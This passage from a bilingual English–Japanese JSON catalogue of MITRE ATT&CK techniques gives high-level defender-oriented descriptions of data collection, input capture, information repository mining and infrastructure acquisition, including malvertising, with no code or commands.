                        "description_jp": "攻撃者は、持ち出し前に、複数のシステムから収集したデータを1つのシステムの中央の場所またはディレクトリにステージングする可能性があります。データは、[収集データのアーカイブ](https://attack.mitre.org/techniques/T1560)などのテクニックを介して、個別のファイルに保持されたり、1つのファイルに結合されたりする場合があります。対話型コマンドシェルが使用される場合があり、[cmd](https://attack.mitre.org/software/S0106)およびbash内の一般的な機能を使用して、データをステージング場所にコピーできます。\n\nクラウド環境では、攻撃者は持ち出し前に特定のインスタンスまたは仮想マシン内にデータをステージングする可能性があります。攻撃者は[クラウドインスタンスの作成](https://attack.mitre.org/techniques/T1578/002)を行い、そのインスタンスにデータをステージングする可能性があります。(引用: Mandiant M-Trends 2020)\n\n持ち出し前に1つのシステムにデータをステージングすることにより、攻撃者はC2サーバーへの接続数を最小限に抑え、検出をよりよく回避できます。"
                    }
                ]
            },
            {
                "id": "T1039",
                "name_eng": "Data from Network Shared Drive",
                "name_jp": "ネットワーク共有ドライブからのデータ",
                "description_eng": "Adversaries may search network shares on computers they have compromised to find files of interest. Sensitive data can be collected from remote systems via shared network drives (host shared directory, network file server, etc.) that are accessible from the current system prior to Exfiltration. Interactive command shells may be in use, and common functionality within [cmd](https://attack.mitre.org/software/S0106) may be used to gather information.",
                "description_jp": "攻撃者は、侵害したコンピュータ上のネットワーク共有を検索して、関心のあるファイルを見つける可能性があります。機密データは、持ち出し前に現在のシステムからアクセス可能な共有ネットワークドライブ（ホスト共有ディレクトリ、ネットワークファイルサーバーなど）を介してリモートシステムから収集できます。対話型コマンドシェルが使用されている可能性があり、[cmd](https://attack.mitre.org/software/S0106)内の一般的な機能を使用して情報を収集できます。",
                "subtechniques": []
            },
            {
                "id": "T1056",
                "name_eng": "Input Capture",
                "name_jp": "入力キャプチャ",
                "description_eng": "Adversaries may use methods of capturing user input to obtain credentials or collect information. During normal system usage, users often provide credentials to various different locations, such as login pages/portals or system dialog boxes. Input capture mechanisms may be transparent to the user (e.g. [Credential API Hooking](https://attack.mitre.org/techniques/T1056/004)) or rely on deceiving the user into providing input into what they believe to be a genuine service (e.g. [Web Portal Capture](https://attack.mitre.org/techniques/T1056/003)).",
                "description_jp": "攻撃者は、ユーザー入力をキャプチャする方法を使用して、資格情報を取得したり情報を収集したりする可能性があります。通常のシステム使用中、ユーザーはログインページ/ポータルやシステムダイアログボックスなど、さまざまな場所に資格情報を提供することがよくあります。入力キャプチャメカニズムは、ユーザーに透過的である場合（例：[資格情報APIフック](https://attack.mitre.org/techniques/T1056/004)）もあれば、ユーザーを騙して正当なサービスであると信じ込ませて入力を提供させることに依存する場合（例：[Webポータルキャプチャ](https://attack.mitre.org/techniques/T1056/003)）もあります。",
                "subtechniques": [
                    {
                        "id": "T1056.001",
                        "name_eng": "Keylogging",
                        "name_jp": "キーロギング",
                        "description_eng": "Adversaries may log user keystrokes to intercept credentials as the user types them. Keylogging is likely to be used to acquire credentials for new access opportunities when [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) efforts are not effective, and may require an adversary to intercept keystrokes on a system for a substantial period of time before credentials can be successfully captured. In order to increase the likelihood of capturing credentials quickly, an adversary may also perform actions such as clearing browser cookies to force users to reauthenticate to systems.(Citation: Talos Kimsuky Nov 2021)\n\nKeylogging is the most prevalent type of input capture, with many different ways of intercepting keystrokes.(Citation: Adventures of a Keystroke) Some methods include:\n\n* Hooking API callbacks used for processing keystrokes. Unlike [Credential API Hooking](https://attack.mitre.org/techniques/T1056/004), this focuses solely on API functions intended for processing keystroke data.\n* Reading raw keystroke data from the hardware buffer.\n* Windows Registry modifications.\n* Custom drivers.\n* [Modify System Image](https://attack.mitre.org/techniques/T1601) may provide adversaries with hooks into the operating system of network devices to read raw keystrokes for login sessions.(Citation: Cisco Blog Legacy Device Attacks)",
                        "description_jp": "攻撃者は、ユーザーが入力する際に資格情報を傍受するために、ユーザーのキーストロークを記録する可能性があります。キーロギングは、[OS資格情報ダンピング](https://attack.mitre.org/techniques/T1003)の取り組みが効果的でない場合に新しいアクセス機会の資格情報を取得するために使用される可能性が高く、資格情報を正常にキャプチャする前に、攻撃者がシステム上のキーストロークをかなりの期間傍受する必要がある場合があります。資格情報を迅速にキャプチャする可能性を高めるために、攻撃者はブラウザのCookieをクリアしてユーザーにシステムへの再認証を強制するなどのアクションを実行することもあります。(引用: Talos Kimsuky Nov 2021)\n\nキーロギングは最も一般的な入力キャプチャの種類であり、キーストロークを傍受するさまざまな方法があります。(引用: Adventures of a Keystroke) いくつかの方法には、次のようなものがあります：\n\n* キーストローク処理に使用されるAPIコールバックのフック。 [認証情報APIフック](https://attack.mitre.org/techniques/T1056/004)とは異なり、これはキーストロークデータの処理を目的としたAPI関数にのみ焦点を当てています。\n* ハードウェアバッファからの生のキーストロークデータの読み取り。\n* Windowsレジストリの変更。\n* カスタムドライバー。\n* [システムイメージの変更](https://attack.mitre.org/techniques/T1601)により、攻撃者はネットワークデバイスのオペレーティングシステムにフックを仕掛け、ログインセッションの生のキーストロークを読み取ることができる場合があります。(引用: Cisco Blog Legacy Device Attacks)"
                    },
                    {
                        "id": "T1056.002",
                        "name_eng": "GUI Input Capture",
                        "name_jp": "GUI入力キャプチャ",
                        "description_eng": "Adversaries may mimic common operating system GUI components to prompt users for credentials with a seemingly legitimate prompt. When programs are executed that need additional privileges than are present in the current user context, it is common for the operating system to prompt the user for proper credentials to authorize the elevated privileges for the task (ex: [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002)).\n\nAdversaries may mimic this functionality to prompt users for credentials with a seemingly legitimate prompt for a number of reasons that mimic normal usage, such as a fake installer requiring additional access or a fake malware removal suite.(Citation: OSX Malware Exploits MacKeeper) This type of prompt can be used to collect credentials via various languages such as [AppleScript](https://attack.mitre.org/techniques/T1059/002)(Citation: LogRhythm Do You Trust Oct 2014)(Citation: OSX Keydnap malware)(Citation: Spoofing credential dialogs) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).(Citation: LogRhythm Do You Trust Oct 2014)(Citation: Enigma Phishing for Credentials Jan 2015)(Citation: Spoofing credential dialogs) On Linux systems adversaries may launch dialog boxes prompting users for credentials from malicious shell scripts or the command line (i.e. [Unix Shell](https://attack.mitre.org/techniques/T1059/004)).(Citation: Spoofing credential dialogs)\n\nAdversaries may also mimic common software authentication requests, such as those from browsers or email clients. This may also be paired with user activity monitoring (i.e., [Browser Information Discovery](https://attack.mitre.org/techniques/T1217) and/or [Application Window Discovery](https://attack.mitre.org/techniques/T1010)) to spoof prompts when users are naturally accessing sensitive sites/data.",
                        "description_jp": "攻撃者は、一般的なオペレーティングシステムのGUIコンポーネントを模倣して、一見正当に見えるプロンプトでユーザーに資格情報を要求する可能性があります。現在のユーザーコンテキストに存在する以上の追加の権限が必要なプログラムが実行されると、オペレーティングシステムがユーザーにタスクの昇格された権限を承認するための適切な資格情報を要求するのが一般的です（例：[ユーザーアカウント制御のバイパス](https://attack.mitre.org/techniques/T1548/002)）。\n\n敵対者は、偽のインストーラーが追加のアクセスを必要とする、または偽のマルウェア駆除スイートなど、通常の使用を模倣する多くの理由から、一見正当に見えるプロンプトでユーザーに資格情報を要求するために、この機能を模倣するかもしれません。(引用：OSX Malware Exploits MacKeeper) この種のプロンプトは、[AppleScript](https://attack.mitre.org/techniques/T1059/002)(引用：LogRhythm Do You Trust Oct 2014)(引用：OSX Keydnap malware)(引用：Spoofing credential dialogs)や[PowerShell](https://attack.mitre.org/techniques/T1059/001)(引用：LogRhythm Do You Trust Oct 2014)(引用：Enigma Phishing for Credentials Jan 2015)(引用：Spoofing credential dialogs)など、様々な言語を介して資格情報を収集するために使用することができます。Linuxシステムでは、敵対者は悪意のあるシェルスクリプトやコマンドライン（すなわち[Unix Shell](https://attack.mitre.org/techniques/T1059/004)）からユーザーに資格情報を要求するダイアログボックスを起動するかもしれません。(引用：Spoofing credential dialogs)\n\n攻撃者はまた、ブラウザやメールクライアントからのものなど、一般的なソフトウェア認証要求を模倣することもあります。これはまた、ユーザーが自然に機密サイト/データにアクセスしているときにプロンプトを偽装するために、ユーザーアクティビティ監視（つまり、[ブラウザ情報ディスカバリ](https://attack.mitre.org/techniques/T1217)および/または[アプリケーションウィンドウディスカバリ](https://attack.mitre.org/techniques/T1010)）と組み合わせることもできます。"
                    },
                    {
                        "id": "T1056.004",
                        "name_eng": "Credential API Hooking",
                        "name_jp": "認証情報APIフック",
                        "description_eng": "Adversaries may hook into Windows application programming interface (API) functions and Linux system functions to collect user credentials. Malicious hooking mechanisms may capture API or function calls that include parameters that reveal user authentication credentials.(Citation: Microsoft TrojanSpy:Win32/Ursnif.gen!I Sept 2017) Unlike [Keylogging](https://attack.mitre.org/techniques/T1056/001), this technique focuses specifically on API functions that include parameters that reveal user credentials. \n\nIn Windows, hooking involves redirecting calls to these functions and can be implemented via:\n\n* **Hooks procedures**, which intercept and execute designated code in response to events such as messages, keystrokes, and mouse inputs.(Citation: Microsoft Hook Overview)(Citation: Elastic Process Injection July 2017)\n* **Import address table (IAT) hooking**, which use modifications to a process’s IAT, where pointers to imported API functions are stored.(Citation: Elastic Process Injection July 2017)(Citation: Adlice Software IAT Hooks Oct 2014)(Citation: MWRInfoSecurity Dynamic Hooking 2015)\n* **Inline hooking**, which overwrites the first bytes in an API function to redirect code flow.(Citation: Elastic Process Injection July 2017)(Citation: HighTech Bridge Inline Hooking Sept 2011)(Citation: MWRInfoSecurity Dynamic Hooking 2015)\n\nIn Linux and macOS, adversaries may hook into system functions via the `LD_PRELOAD` (Linux) or `DYLD_INSERT_LIBRARIES` (macOS) environment variables, which enables loading shared libraries into a program’s address space. For example, an adversary may capture credentials by hooking into the `libc read` function leveraged by SSH or SCP.(Citation: Intezer Symbiote 2022)",
                        "description_jp": "攻撃者は、Windowsアプリケーションプログラミングインターフェイス（API）関数やLinuxシステム関数にフックして、ユーザー資格情報を収集する可能性があります。悪意のあるフックメカニズムは、ユーザー認証資格情報を明らかにするパラメータを含むAPIまたは関数呼び出しをキャプチャする可能性があります。(引用: Microsoft TrojanSpy:Win32/Ursnif.gen!I Sept 2017) [キーロギング](https://attack.mitre.org/techniques/T1056/001)とは異なり、このテクニックはユーザー資格情報を明らかにするパラメータを含むAPI関数に特に焦点を当てています。\n\nWindowsでは、これらの関数への呼び出しをリダイレクトするフッキングは、以下を介して実装できます：\n\n* **フックプロシージャ**。メッセージ、キーストローク、マウス入力などのイベントに応答して指定されたコードを傍受し実行します。(引用: Microsoft Hook Overview)(引用: Elastic Process Injection July 2017)\n* **インポートアドレステーブル（IAT）フック**。プロセスのIAT（インポートされたAPI関数へのポインタが格納される場所）への変更を使用します。(引用: Elastic Process Injection July 2017)(引用: Adlice Software IAT Hooks Oct 2014)(引用: MWRInfoSecurity Dynamic Hooking 2015)\n* **インラインフック**。コードフローをリダイレクトするためにAPI関数の最初のバイトを上書きします。(引用: Elastic Process Injection July 2017)(引用: HighTech Bridge Inline Hooking Sept 2011)(引用: MWRInfoSecurity Dynamic Hooking 2015)\n\nLinuxおよびmacOSでは、攻撃者は<code>LD_PRELOAD</code>（Linux）または<code>DYLD_INSERT_LIBRARIES</code>（macOS）環境変数を介してシステム関数にフックする可能性があり、これにより共有ライブラリをプログラムのアドレス空間にロードできます。例えば、攻撃者はSSHまたはSCPによって利用される<code>libc read</code>関数にフックすることにより資格情報をキャプチャする可能性があります。(引用: Intezer Symbiote 2022)"
                    },
                    {
                        "id": "T1056.003",
                        "name_eng": "Web Portal Capture",
                        "name_jp": "Webポータルキャプチャ",
                        "description_eng": "Adversaries may install code on externally facing portals, such as a VPN login page, to capture and transmit credentials of users who attempt to log into the service. For example, a compromised login page may log provided user credentials before logging the user in to the service.\n\nThis variation on input capture may be conducted post-compromise using legitimate administrative access as a backup measure to maintain network access through [External Remote Services](https://attack.mitre.org/techniques/T1133) and [Valid Accounts](https://attack.mitre.org/techniques/T1078) or as part of the initial compromise by exploitation of the externally facing web service.(Citation: Volexity Virtual Private Keylogging)",
                        "description_jp": "攻撃者は、VPNログインページなどの外部向けポータルにコードをインストールして、サービスにログインしようとするユーザーの資格情報をキャプチャして送信する可能性があります。例えば、侵害されたログインページは、ユーザーをサービスにログインさせる前に、提供されたユーザー資格情報を記録する可能性があります。\n\nこの入力キャプチャのバリエーションは、[外部リモートサービス](https://attack.mitre.org/techniques/T1133)および[有効なアカウント](https://attack.mitre.org/techniques/T1078)を介したネットワークアクセスを維持するためのバックアップ手段として、または外部向けWebサービスのエクスプロイトによる初期侵害の一部として、侵害後に正当な管理者アクセスを使用して実行される場合があります。(引用: Volexity Virtual Private Keylogging)"
                    }
                ]
            },
            {
                "id": "T1213",
                "name_eng": "Data from Information Repositories",
                "name_jp": "情報リポジトリからのデータ",
                "description_eng": "Adversaries may leverage information repositories to mine valuable information. Information repositories are tools that allow for storage of information, typically to facilitate collaboration or information sharing between users, and can store a wide variety of data that may aid adversaries in further objectives, such as Credential Access, Lateral Movement, or Defense Evasion, or direct access to the target information. Adversaries may also abuse external sharing features to share sensitive documents with recipients outside of the organization (i.e., [Transfer Data to Cloud Account](https://attack.mitre.org/techniques/T1537)). \n\nThe following is a brief list of example information that may hold potential value to an adversary and may also be found on an information repository:\n\n* Policies, procedures, and standards\n* Physical / logical network diagrams\n* System architecture diagrams\n* Technical system documentation\n* Testing / development credentials (i.e., [Unsecured Credentials](https://attack.mitre.org/techniques/T1552)) \n* Work / project schedules\n* Source code snippets\n* Links to network shares and other internal resources\n* Contact or other sensitive information about business partners and customers, including personally identifiable information (PII) \n\nInformation stored in a repository may vary based on the specific instance or environment. Specific common information repositories include the following:\n\n* Storage services such as IaaS databases, enterprise databases, and more specialized platforms such as customer relationship management (CRM) databases \n* Collaboration platforms such as SharePoint, Confluence, and code repositories\n* Messaging platforms such as Slack and Microsoft Teams \n\nIn some cases, information repositories have been improperly secured, typically by unintentionally allowing for overly-broad access by all users or even public access to unauthenticated users. This is particularly common with cloud-native or cloud-hosted services, such as AWS Relational Database Service (RDS), Redis, or ElasticSearch.(Citation: Mitiga)(Citation: TrendMicro Exposed Redis 2020)(Citation: Cybernews Reuters Leak 2022)",
                "description_jp": "攻撃者は情報リポジトリを利用して貴重な情報を採掘する可能性があります。情報リポジトリは、通常、ユーザー間のコラボレーションや情報共有を容易にするために情報の保存を可能にするツールであり、資格情報アクセス、横方向の移動、防御回避、またはターゲット情報への直接アクセスなど、攻撃者がさらなる目的を達成するのに役立つ可能性のある多種多様なデータを保存できます。攻撃者はまた、外部共有機能を悪用して、機密文書を組織外の受信者と共有する（つまり、[クラウドアカウントへのデータ転送](https://attack.mitre.org/techniques/T1537)）可能性もあります。\n\n以下は、敵対者にとって潜在的な価値を持つ可能性があり、情報リポジトリで見つかる可能性のある情報の簡単なリストです：\n\n* ポリシー、手順、および基準\n* 物理/論理ネットワーク図\n* システムアーキテクチャ図\n* 技術的なシステムドキュメント\n* テスト/開発資格情報（つまり、[安全でない資格情報](https://attack.mitre.org/techniques/T1552)）\n* 作業/プロジェクトスケジュール\n* ソースコードスニペット\n* ネットワーク共有やその他の内部リソースへのリンク\n* 個人を特定できる情報（PII）を含む、ビジネスパートナーや顧客に関する連絡先またはその他の機密情報\n\nリポジトリに保存されている情報は、特定のインスタンスまたは環境によって異なる場合があります。特定の一般的な情報リポジトリには、次のものが含まれます：\n\n* IaaSデータベース、エンタープライズデータベース、および顧客関係管理（CRM）データベースなどのより専門的なプラットフォームなどのストレージサービス\n* SharePoint、Confluence、コードリポジトリなどのコラボレーションプラットフォーム\n* SlackやMicrosoft Teamsなどのメッセージングプラットフォーム\n\n場合によっては、情報リポジトリが不適切に保護されており、通常は意図せずにすべてのユーザーによる過度に広範なアクセス、または認証されていないユーザーによるパブリックアクセスさえも許可されています。これは、AWS Relational Database Service (RDS)、Redis、ElasticSearchなど、クラウドネイティブまたはクラウドホスト型サービスで特に一般的です。(引用: Mitiga)(引用: TrendMicro Exposed Redis 2020)(引用: Cybernews Reuters Leak 2022)",
                "subtechniques": [
                    {
                        "id": "T1213.003",
                        "name_eng": "Code Repositories",
                        "name_jp": "コードリポジトリ",
                        "description_eng": "Adversaries may leverage code repositories to collect valuable information. Code repositories are tools/services that store source code and automate software builds. They may be hosted internally or privately on third party sites such as Github, GitLab, SourceForge, and BitBucket. Users typically interact with code repositories through a web application or command-line utilities such as git.\n\nOnce adversaries gain access to a victim network or a private code repository, they may collect sensitive information such as proprietary source code or [Unsecured Credentials](https://attack.mitre.org/techniques/T1552) contained within software's source code.  Having access to software's source code may allow adversaries to develop [Exploits](https://attack.mitre.org/techniques/T1587/004), while credentials may provide access to additional resources using [Valid Accounts](https://attack.mitre.org/techniques/T1078).(Citation: Wired Uber Breach)(Citation: Krebs Adobe)\n\n**Note:** This is distinct from [Code Repositories](https://attack.mitre.org/techniques/T1593/003), which focuses on conducting [Reconnaissance](https://attack.mitre.org/tactics/TA0043) via public code repositories.",
                        "description_jp": "攻撃者はコードリポジトリを利用して貴重な情報を収集する可能性があります。コードリポジトリは、ソースコードを保存しソフトウェアビルドを自動化するツール/サービスです。これらは、Github、GitLab、SourceForge、BitBucketなどのサードパーティサイトで内部またはプライベートにホストされる場合があります。ユーザーは通常、Webアプリケーションまたはgitなどのコマンドラインユーティリティを介してコードリポジトリと対話します。\n\n攻撃者が被害者ネットワークまたはプライベートコードリポジトリへのアクセスを取得すると、独自のソースコードやソフトウェアのソースコードに含まれる[安全でない資格情報](https://attack.mitre.org/techniques/T1552)などの機密情報を収集する可能性があります。ソフトウェアのソースコードにアクセスできると、攻撃者は[エクスプロイト](https://attack.mitre.org/techniques/T1587/004)を開発でき、資格情報は[有効なアカウント](https://attack.mitre.org/techniques/T1078)を使用して追加リソースへのアクセスを提供する可能性があります。(引用: Wired Uber Breach)(引用: Krebs Adobe)\n\n**注:** これは、パブリックコードリポジトリを介した[偵察](https://attack.mitre.org/tactics/TA0043)の実施に焦点を当てた[コードリポジトリ](https://attack.mitre.org/techniques/T1593/003)とは異なります。"
                    },
                    {
                        "id": "T1213.005",
                        "name_eng": "Messaging Applications",
                        "name_jp": "メッセージングアプリケーション",
                        "description_eng": "Adversaries may leverage chat and messaging applications, such as Microsoft Teams, Google Chat, and Slack, to mine valuable information.  \n\nThe following is a brief list of example information that may hold potential value to an adversary and may also be found on messaging applications: \n\n* Testing / development credentials (i.e., [Chat Messages](https://attack.mitre.org/techniques/T1552/008)) \n* Source code snippets \n* Links to network shares and other internal resources \n* Proprietary data(Citation: Guardian Grand Theft Auto Leak 2022)\n* Discussions about ongoing incident response efforts(Citation: SC Magazine Ragnar Locker 2021)(Citation: Microsoft DEV-0537)\n\nIn addition to exfiltrating data from messaging applications, adversaries may leverage data from chat messages in order to improve their targeting - for example, by learning more about an environment or evading ongoing incident response efforts.(Citation: Sentinel Labs NullBulge 2024)(Citation: Permiso Scattered Spider 2023)",
                        "description_jp": "攻撃者は、Microsoft Teams、Google Chat、Slackなどのチャットおよびメッセージングアプリケーションを利用して、貴重な情報を採掘する可能性があります。\n\n以下は、敵対者にとって潜在的な価値を持つ可能性があり、メッセージングアプリケーションでも見つかる可能性のある情報の簡単なリストです：\n\n* テスト/開発資格情報（つまり、[チャットメッセージ](https://attack.mitre.org/techniques/T1552/008)）\n* ソースコードスニペット\n* ネットワーク共有やその他の内部リソースへのリンク\n* 専有データ(引用: Guardian Grand Theft Auto Leak 2022)\n* 進行中のインシデント対応活動に関する議論(引用: SC Magazine Ragnar Locker 2021)(引用: Microsoft DEV-0537)\n\nメッセージングアプリケーションからデータを持ち出すことに加えて、攻撃者はチャットメッセージからのデータを利用して、例えば環境についてさらに学習したり、進行中のインシデント対応活動を回避したりするなど、ターゲティングを改善する可能性があります。(引用: Sentinel Labs NullBulge 2024)(引用: Permiso Scattered Spider 2023)"
                    },
                    {
                        "id": "T1213.004",
                        "name_eng": "Customer Relationship Management Software",
                        "name_jp": "顧客関係管理ソフトウェア",
                        "description_eng": "Adversaries may leverage Customer Relationship Management (CRM) software to mine valuable information. CRM software is used to assist organizations in tracking and managing customer interactions, as well as storing customer data.\n\nOnce adversaries gain access to a victim organization, they may mine CRM software for customer data. This may include personally identifiable information (PII) such as full names, emails, phone numbers, and addresses, as well as additional details such as purchase histories and IT support interactions. By collecting this data, an adversary may be able to send personalized [Phishing](https://attack.mitre.org/techniques/T1566) emails, engage in SIM swapping, or otherwise target the organization’s customers in ways that enable financial gain or the compromise of additional organizations.(Citation: Bleeping Computer US Cellular Hack 2022)(Citation: Bleeping Computer Mint Mobile Hack 2021)(Citation: Bleeping Computer Bank Hack 2020)\n\nCRM software may be hosted on-premises or in the cloud. Information stored in these solutions may vary based on the specific instance or environment. Examples of CRM software include Microsoft Dynamics 365, Salesforce, Zoho, Zendesk, and HubSpot.",
                        "description_jp": "攻撃者は、顧客関係管理（CRM）ソフトウェアを利用して貴重な情報をマイニングする可能性があります。CRMソフトウェアは、組織が顧客とのやり取りを追跡および管理し、顧客データを保存するのに役立てるために使用されます。\n\n攻撃者が被害組織へのアクセスを取得すると、CRMソフトウェアから顧客データをマイニングする可能性があります。これには、氏名、メールアドレス、電話番号、住所などの個人識別情報（PII）や、購入履歴やITサポートとのやり取りなどの追加詳細が含まれる場合があります。このデータを収集することにより、攻撃者はパーソナライズされた[フィッシング](https://attack.mitre.org/techniques/T1566)メールを送信したり、SIMスワッピングを行ったり、あるいは金銭的利益を得たり追加の組織を侵害したりする方法で組織の顧客を標的にしたりできる可能性があります。(引用: Bleeping Computer US Cellular Hack 2022)(引用: Bleeping Computer Mint Mobile Hack 2021)(引用: Bleeping Computer Bank Hack 2020)\n\nCRMソフトウェアは、オンプレミスまたはクラウドでホストされる場合があります。これらのソリューションに保存されている情報は、特定のインスタンスまたは環境によって異なる場合があります。CRMソフトウェアの例としては、Microsoft Dynamics 365、Salesforce、Zoho、Zendesk、HubSpotなどがあります。"
                    },
                    {
                        "id": "T1213.002",
                        "name_eng": "Sharepoint",
                        "name_jp": "SharePoint",
                        "description_eng": "Adversaries may leverage the SharePoint repository as a source to mine valuable information. SharePoint will often contain useful information for an adversary to learn about the structure and functionality of the internal network and systems. For example, the following is a list of example information that may hold potential value to an adversary and may also be found on SharePoint:\n\n* Policies, procedures, and standards\n* Physical / logical network diagrams\n* System architecture diagrams\n* Technical system documentation\n* Testing / development credentials (i.e., [Unsecured Credentials](https://attack.mitre.org/techniques/T1552))\n* Work / project schedules\n* Source code snippets\n* Links to network shares and other internal resources",
                        "description_jp": "攻撃者は、SharePointリポジトリを貴重な情報を採掘するためのソースとして利用する可能性があります。SharePointには、攻撃者が内部ネットワークやシステムの構造と機能を理解するのに役立つ情報が含まれていることがよくあります。例えば、以下は攻撃者にとって潜在的な価値を持つ可能性があり、SharePointでも見つかる可能性のある情報の例のリストです：\n\n* ポリシー、手順、および基準\n* 物理/論理ネットワーク図\n* システムアーキテクチャ図\n* 技術的なシステムドキュメント\n* テスト/開発資格情報（つまり、[安全でない資格情報](https://attack.mitre.org/techniques/T1552)）\n* 作業/プロジェクトスケジュール\n* ソースコードスニペット\n* ネットワーク共有やその他の内部リソースへのリンク"
                    },
                    {
                        "id": "T1213.001",
                        "name_eng": "Confluence",
                        "name_jp": "Confluence",
                        "description_eng": "Adversaries may leverage Confluence repositories to mine valuable information. Often found in development environments alongside Atlassian JIRA, Confluence is generally used to store development-related documentation, however, in general may contain more diverse categories of useful information, such as:\n\n* Policies, procedures, and standards\n* Physical / logical network diagrams\n* System architecture diagrams\n* Technical system documentation\n* Testing / development credentials (i.e., [Unsecured Credentials](https://attack.mitre.org/techniques/T1552))\n* Work / project schedules\n* Source code snippets\n* Links to network shares and other internal resources",
                        "description_jp": "攻撃者はConfluenceリポジトリを利用して貴重な情報をマイニングする可能性があります。多くの場合、Atlassian JIRAと共に開発環境で見られるConfluenceは、一般的に開発関連のドキュメントを保存するために使用されますが、一般的には、次のようなより多様なカテゴリの有用な情報が含まれている可能性があります：\n\n* ポリシー、手順、および基準\n* 物理/論理ネットワーク図\n* システムアーキテクチャ図\n* 技術的なシステムドキュメント\n* テスト/開発資格情報（つまり、[安全でない資格情報](https://attack.mitre.org/techniques/T1552)）\n* 作業/プロジェクトスケジュール\n* ソースコードスニペット\n* ネットワーク共有やその他の内部リソースへのリンク"
                    }
                ]
            }
        ]
    },
    {
        "id": "TA0042",
        "name_eng": "Resource Development",
        "name_jp": "リソース開発",
        "description_eng": "The adversary is trying to establish resources they can use to support operations.\n\nResource Development consists of techniques that involve adversaries creating, purchasing, or compromising/stealing resources that can be used to support targeting. Such resources include infrastructure, accounts, or capabilities. These resources can be leveraged by the adversary to aid in other phases of the adversary lifecycle, such as using purchased domains to support Command and Control, email accounts for phishing as a part of Initial Access, or stealing code signing certificates to help with Defense Evasion.",
        "description_jp": "攻撃者は、作戦を支援するために使用できるリソースを確立しようとしています。\n\nリソース開発は、攻撃者がターゲティングをサポートするために使用できるリソースを作成、購入、または侵害/窃取することを含むテクニックで構成されます。そのようなリソースには、インフラストラクチャ、アカウント、または機能が含まれます。これらのリソースは、コマンドアンドコントロールをサポートするための購入済みドメインの使用、初期アクセスの一環としてのフィッシング用のメールアカウント、または防御回避を支援するためのコード署名証明書の窃取など、攻撃者ライフサイクルの他のフェーズを支援するために攻撃者によって活用される可能性があります。",
        "techniques": [
            {
                "id": "T1583",
                "name_eng": "Acquire Infrastructure",
                "name_jp": "インフラストラクチャの取得",
                "description_eng": "Adversaries may buy, lease, rent, or obtain infrastructure that can be used during targeting. A wide variety of infrastructure exists for hosting and orchestrating adversary operations. Infrastructure solutions include physical or cloud servers, domains, and third-party web services.(Citation: TrendmicroHideoutsLease) Some infrastructure providers offer free trial periods, enabling infrastructure acquisition at limited to no cost.(Citation: Free Trial PurpleUrchin) Additionally, botnets are available for rent or purchase.\n\nUse of these infrastructure solutions allows adversaries to stage, launch, and execute operations. Solutions may help adversary operations blend in with traffic that is seen as normal, such as contacting third-party web services or acquiring infrastructure to support [Proxy](https://attack.mitre.org/techniques/T1090), including from residential proxy services.(Citation: amnesty_nso_pegasus)(Citation: FBI Proxies Credential Stuffing)(Citation: Mandiant APT29 Microsoft 365 2022) Depending on the implementation, adversaries may use infrastructure that makes it difficult to physically tie back to them as well as utilize infrastructure that can be rapidly provisioned, modified, and shut down.",
                "description_jp": "攻撃者は、ターゲティング中に使用できるインフラストラクチャを購入、リース、レンタル、または取得する可能性があります。攻撃者の作戦をホストおよび調整するためのさまざまなインフラストラクチャが存在します。インフラストラクチャソリューションには、物理サーバーまたはクラウドサーバー、ドメイン、およびサードパーティのWebサービスが含まれます。(引用: TrendmicroHideoutsLease) 一部のインフラストラクチャプロバイダーは無料試用期間を提供しており、これによりインフラストラクチャを限定的または無料で取得できます。(引用: Free Trial PurpleUrchin) さらに、ボットネットはレンタルまたは購入可能です。\n\nこれらのインフラストラクチャソリューションを使用すると、攻撃者は作戦を準備、開始、実行できます。ソリューションは、サードパーティのWebサービスへのアクセスや、住宅用プロキシサービスからのものを含む[プロキシ](https://attack.mitre.org/techniques/T1090)をサポートするためのインフラストラクチャの取得など、通常と見なされるトラフィックと攻撃者の作戦が混同されるのに役立つ場合があります。(引用: amnesty_nso_pegasus)(引用: FBI Proxies Credential Stuffing)(引用: Mandiant APT29 Microsoft 365 2022) 実装によっては、攻撃者は物理的に追跡することが困難なインフラストラクチャを使用したり、迅速にプロビジョニング、変更、シャットダウンできるインフラストラクチャを利用したりする場合があります。",
                "subtechniques": [
                    {
                        "id": "T1583.008",
                        "name_eng": "Malvertising",
                        "name_jp": "マルバタイジング",
                        "description_eng": "Adversaries may purchase online advertisements that can be abused to distribute malware to victims. Ads can be purchased to plant as well as favorably position artifacts in specific locations  online, such as prominently placed within search engine results. These ads may make it more difficult for users to distinguish between actual search results and advertisements.(Citation: spamhaus-malvertising) Purchased ads may also target specific audiences using the advertising network’s capabilities, potentially further taking advantage of the trust inherently given to search engines and popular websites. \n\nAdversaries may purchase ads and other resources to help distribute artifacts containing malicious code to victims. Purchased ads may attempt to impersonate or spoof well-known brands. For example, these spoofed ads may trick victims into clicking the ad which could then send them to a malicious domain that may be a clone of official websites containing trojanized versions of the advertised software.(Citation: Masquerads-Guardio)(Citation: FBI-search) Adversary’s efforts to create malicious domains and purchase advertisements may also be automated at scale to better resist cleanup efforts.(Citation: sentinelone-malvertising) \n\nMalvertising may be used to support [Drive-by Target](https://attack.mitre.org/techniques/T1608/004) and [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), potentially requiring limited interaction from the user if the ad contains code/exploits that infect the target system's web browser.(Citation: BBC-malvertising)\n\nAdversaries may also employ several techniques to evade detection by the advertising network. For example, adversaries may dynamically route ad clicks to send automated crawler/policy enforcer traffic to benign sites while validating potential targets then sending victims referred from real ad clicks to malicious pages. This infection vector may therefore remain hidden from the ad network as well as any visitor not reaching the malicious sites with a valid identifier from clicking on the advertisement.(Citation: Masquerads-Guardio) Other tricks, such as intentional typos to avoid brand reputation monitoring, may also be used to evade automated detection.(Citation: spamhaus-malvertising)",
